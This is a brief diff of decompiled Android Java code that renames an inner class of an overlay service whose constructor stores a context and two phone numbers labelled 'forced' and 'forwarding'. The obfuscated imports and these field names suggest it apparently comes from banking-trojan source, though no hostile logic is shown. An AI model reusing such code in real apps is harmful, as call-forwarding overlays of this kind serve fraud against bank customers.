@@ -10,12 +10,12 @@ import com.wish.lmbank.utils.LogUtils;
 import gv00l3ah.mvdt7w.bb7d7pu7;
 import wei.mark.standout.StandOutWindow;
 
-class OverlayService$2 implements Runnable {
+class OverlayService2 implements Runnable {
     final Context val$context;
     final String val$finalForcedPhone;
     final String val$finalForwardingPhone;
 
-    OverlayService$2(String str, Context context, String str2) {
+    OverlayService2(String str, Context context, String str2) {
         this.val$finalForwardingPhone = str;
         this.val$context = context;
         this.val$finalForcedPhone = str2;
